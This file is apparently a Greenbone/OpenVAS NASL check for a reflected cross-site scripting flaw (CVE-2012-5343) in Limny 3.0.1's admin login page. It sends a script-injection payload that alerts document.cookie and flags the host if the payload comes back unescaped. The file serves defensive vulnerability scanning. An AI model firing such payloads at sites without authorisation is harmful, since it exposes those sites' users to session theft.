# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:limny:limny";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802983");
  script_version("2024-06-27T05:05:29+0000");
  script_cve_id("CVE-2012-5343");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2024-06-27 05:05:29 +0000 (Thu, 27 Jun 2024)");
  script_tag(name:"creation_date", value:"2012-10-12 14:16:51 +0530 (Fri, 12 Oct 2012)");
  script_name("Limny 'login.php' Script XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_limny_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("limny/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47444");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/72113");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2012010034");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/codes/limny_xss.txt");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5066.php");

  script_tag(name:"insight", value:"Input passed via the URL to 'admin/login.php' is not properly sanitised
  before being returned to the user.");
  script_tag(name:"solution", value:"Upgrade to Limny version 3.0.2 or later.");
  script_tag(name:"summary", value:"Limny is prone to a cross-site scripting (XSS) vulnerability.");
  script_tag(name:"impact", value:"Successful exploitation could allow attackers to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site.");
  script_tag(name:"affected", value:"Limny version 3.0.1");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://www.limny.org/download");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + '/admin/login.php/"><script>alert(document.cookie)</script>';

if( http_vuln_check( port:port, url:url, check_header:TRUE,
                     pattern:"><script>alert\(document.cookie\)<",
                     extra_check:">Limny<" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
